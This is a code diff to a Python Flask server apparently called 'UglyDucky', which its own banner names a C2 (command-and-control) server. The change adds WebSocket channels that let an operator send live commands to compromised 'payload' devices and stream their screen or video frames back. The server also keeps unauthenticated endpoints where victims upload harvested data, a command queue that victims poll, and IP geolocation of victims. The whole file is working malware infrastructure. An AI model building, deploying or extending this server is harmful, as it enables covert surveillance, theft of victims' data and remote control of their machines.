@@ -3,160 +3,132 @@ import os
 import requests
 from flask import Flask, request, jsonify
 from flask_cors import CORS
+from flask_socketio import SocketIO, emit, join_room
 from datetime import datetime, timedelta, timezone
 
 app = Flask(__name__)
-# Enable CORS so the frontend can communicate with this API
 CORS(app)
+# Initialize SocketIO with Eventlet for high-performance async WebSockets
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet', max_http_buffer_size=10000000)
 
-# Credentials from Render Environment Variables
 SUPABASE_URL = os.environ.get("SUPABASE_URL")
-SUPABASE_KEY = os.environ.get("SUPABASE_KEY") # MAKE SURE THIS IS THE SERVICE_ROLE KEY!
-
-# --- NEW SECURITY MEASURE ---
-# This stops random people from guessing your Render URL and reading your logs.
-# You can change "ducky_admin_2024" to any secret password you want.
+SUPABASE_KEY = os.environ.get("SUPABASE_KEY") 
 DASHBOARD_PASSWORD = os.environ.get("DASHBOARD_PASSWORD", "ducky_admin_2024")
 
 command_queue = {}
+dashboard_sockets = set()
+payload_sockets = {}
 
 # ---------------------------------------------------------
-# HELPER FUNCTIONS
+# WEBSOCKETS (LIVE STREAMING & COMMANDS)
 # ---------------------------------------------------------
-def get_node_status(last_seen_str):
-    if not last_seen_str: 
-        return "red", "Offline"
+@socketio.on('connect')
+def handle_connect():
+    pass # Accept all connections initially
+
+@socketio.on('register_dashboard')
+def register_dash(data):
+    """Dashboard authenticates and joins the admin room."""
+    if data.get('password') == DASHBOARD_PASSWORD:
+        dashboard_sockets.add(request.sid)
+        join_room('dashboards')
+        emit('dash_sys_msg', {'msg': 'WebSocket authenticated successfully.'})
+
+@socketio.on('register_payload')
+def register_payload(data):
+    """Payload announces itself and joins a room specific to its ID."""
+    device_id = data.get('device_id')
+    if device_id:
+        payload_sockets[device_id] = request.sid
+        join_room(device_id)
+
+@socketio.on('dash_command')
+def dash_command(data):
+    """Dashboard sends a real-time command (e.g., start_stream). Forward to specific payload."""
+    if request.sid in dashboard_sockets:
+        device_id = data.get('device_id')
+        if device_id in payload_sockets:
+            # Forward the exact data payload to the specific device's room
+            emit('payload_command', data, room=device_id)
+
+@socketio.on('payload_stream')
+def payload_stream(data):
+    """Payload sends video frames or monitor lists. Forward to all dashboards."""
+    # Forward the frame instantly to the dashboard room
+    emit('dash_stream', data, room='dashboards')
+
+# ---------------------------------------------------------
+# HTTP ENDPOINTS (VAULT & BACKWARD COMPATIBILITY)
+# ---------------------------------------------------------
+def get_node_status(last_seen_str, device_id):
+    # If the payload has an active WebSocket, it's LIVE.
+    if device_id in payload_sockets:
+        return "green", "Live (WS)"
+        
+    if not last_seen_str: return "red", "Offline"
     last_seen = datetime.fromisoformat(last_seen_str).replace(tzinfo=timezone.utc)
     now = datetime.now(timezone.utc)
-    
-    if now - last_seen < timedelta(minutes=2): 
-        return "green", "Online"
-    if now - last_seen < timedelta(hours=1): 
-        return "yellow", "Idle"
+    if now - last_seen < timedelta(minutes=2): return "green", "Online"
+    if now - last_seen < timedelta(hours=1): return "yellow", "Idle"
     return "red", "Offline"
 
 def geolocate_ip(ip):
-    if not ip or ip in ["127.0.0.1", "Unknown"]: 
-        return 28.5383, -81.3792 
+    if not ip or ip in ["127.0.0.1", "Unknown"]: return 28.5383, -81.3792 
     try:
-        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
-        if response.ok:
-            data = response.json()
-            if data.get("status") == "success":
-                return float(data.get("lat")), float(data.get("lon"))
-    except:
-        pass
+        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
+        if resp.ok and resp.json().get("status") == "success":
+            return float(resp.json().get("lat")), float(resp.json().get("lon"))
+    except: pass
     return 28.5383, -81.3792 
 
-# ---------------------------------------------------------
-# DASHBOARD ENDPOINTS (Proxy to Supabase)
-# ---------------------------------------------------------
 @app.route('/node/<device_id>', methods=['GET'])
 def get_single_node(device_id):
-    """Fetches summary data (IP, OS, Last Seen, Location) for ONE node."""
-    # SECURITY CHECK: Make sure the request came from your dashboard
-    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
-        return jsonify({"error": "Unauthorized access"}), 401
-
-    if not SUPABASE_KEY or not SUPABASE_URL:
-        return jsonify({"error": "Supabase key/URL missing in Render Environment"}), 500
-
+    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
     headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
-    
     try:
-        time_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&select=created_at&order=created_at.desc&limit=1"
-        response = requests.get(time_url, headers=headers)
-        response.raise_for_status()
-        device_data = response.json()
-
-        if not device_data:
-            return jsonify({"error": "Node not found"}), 404
-
+        device_data = requests.get(f"{SUPABASE_URL}?device_id=eq.{device_id}&select=created_at&order=created_at.desc&limit=1", headers=headers).json()
+        if not device_data: return jsonify({"error": "Node not found"}), 404
         last_seen = device_data[0]['created_at']
-        sysinfo_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&category=eq.System Info&select=content&limit=1"
-        sysinfo_resp = requests.get(sysinfo_url, headers=headers)
-        
-        os_info, ip_info = "Windows (Assumed)", "Unknown IP"
+
+        sysinfo_resp = requests.get(f"{SUPABASE_URL}?device_id=eq.{device_id}&category=eq.System Info&select=content&limit=1", headers=headers)
+        os_info, ip_info = "Windows", "Unknown IP"
         if sysinfo_resp.ok and sysinfo_resp.json():
-            content = sysinfo_resp.json()[0]['content']
-            for line in content.split('\n'):
-                if line.startswith('Caption='): 
-                    os_info = line.split('=')[-1].strip()
-                elif line.startswith('PUBLIC IP:'): 
-                    ip_info = line.split(':')[-1].strip()
+            for line in sysinfo_resp.json()[0]['content'].split('\n'):
+                if line.startswith('Caption='): os_info = line.split('=')[-1].strip()
+                elif line.startswith('PUBLIC IP:'): ip_info = line.split(':')[-1].strip()
 
-        status_color, _ = get_node_status(last_seen)
+        status_color, stat_text = get_node_status(last_seen, device_id)
         lat, lng = geolocate_ip(ip_info)
-        
-        return jsonify({
-            "id": device_id, "os": os_info, "ip": ip_info, "lat": lat, "lng": lng,
-            "status": status_color, "last_seen": last_seen
-        })
-
-    except requests.exceptions.RequestException as e:
-        return jsonify({"error": f"Failed to fetch from Supabase: {e}"}), 500
+        return jsonify({"id": device_id, "os": os_info, "ip": ip_info, "lat": lat, "lng": lng, "status": status_color, "stat_text": stat_text, "last_seen": last_seen})
+    except Exception as e: return jsonify({"error": str(e)}), 500
 
 @app.route('/logs/<device_id>', methods=['GET'])
 def get_logs(device_id):
-    """Fetches all harvested data logs for ONE node."""
-    # SECURITY CHECK: Make sure the request came from your dashboard
-    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
-        return jsonify({"error": "Unauthorized access"}), 401
-
-    if not SUPABASE_KEY or not SUPABASE_URL:
-        return jsonify({"error": "Supabase Configuration missing"}), 500
-
+    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
     headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
-    url = f"{SUPABASE_URL}?device_id=eq.{device_id}&order=created_at.desc"
-    try:
-        response = requests.get(url, headers=headers, timeout=10)
-        response.raise_for_status()
-        return jsonify(response.json()), 200
-    except requests.exceptions.RequestException: 
-        return jsonify({"error": "Database fetch failed"}), 500
+    try: return jsonify(requests.get(f"{SUPABASE_URL}?device_id=eq.{device_id}&order=created_at.desc", headers=headers, timeout=10).json()), 200
+    except: return jsonify({"error": "Fetch failed"}), 500
 
-# ---------------------------------------------------------
-# PAYLOAD ENDPOINTS
-# ---------------------------------------------------------
 @app.route('/logs', methods=['POST'])
 def push_logs():
-    """Payload posts new harvested data here."""
-    # Note: No password check here so the payload can freely push data
-    if not SUPABASE_KEY or not SUPABASE_URL:
-        return jsonify({"error": "Supabase Configuration missing"}), 500
-
     headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Prefer": "return=minimal,resolution=merge-duplicates"}
-    upsert_url = f"{SUPABASE_URL}?on_conflict=device_id,category"
-    try:
-        response = requests.post(upsert_url, json=request.json, headers=headers, timeout=15)
-        response.raise_for_status()
-        return jsonify({"status": "success"}), 200
-    except requests.exceptions.RequestException: 
-        return jsonify({"error": "Database push failed"}), 500
+    try: requests.post(f"{SUPABASE_URL}?on_conflict=device_id,category", json=request.json, headers=headers, timeout=15)
+    except: pass
+    return jsonify({"status": "success"}), 200
 
 @app.route('/issue', methods=['POST'])
 def issue_command():
-    # SECURITY CHECK: Only Dashboard can issue commands
-    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
-        return jsonify({"error": "Unauthorized access"}), 401
-        
-    data = request.json
-    device_id = data.get('device_id')
-    command = data.get('command')
-    if not device_id or not command: 
-        return jsonify({"error": "device_id and command are required"}), 400
-    command_queue[device_id] = command
-    return jsonify({"status": "command queued"}), 200
+    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
+    command_queue[request.json.get('device_id')] = request.json.get('command')
+    return jsonify({"status": "queued"}), 200
 
 @app.route('/poll/<device_id>', methods=['GET'])
 def poll_for_command(device_id):
-    """Payload continuously asks this endpoint for commands."""
-    command = command_queue.pop(device_id, None)
-    return jsonify({"command": command})
+    return jsonify({"command": command_queue.pop(device_id, None)})
 
 @app.route('/')
-def index(): 
-    return "UglyDucky Secure Server."
+def index(): return "UglyDucky C2 WebSockets Active."
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+    # Must use socketio.run instead of app.run for WebSockets
+    socketio.run(app, host='0.0.0.0', port=10000)
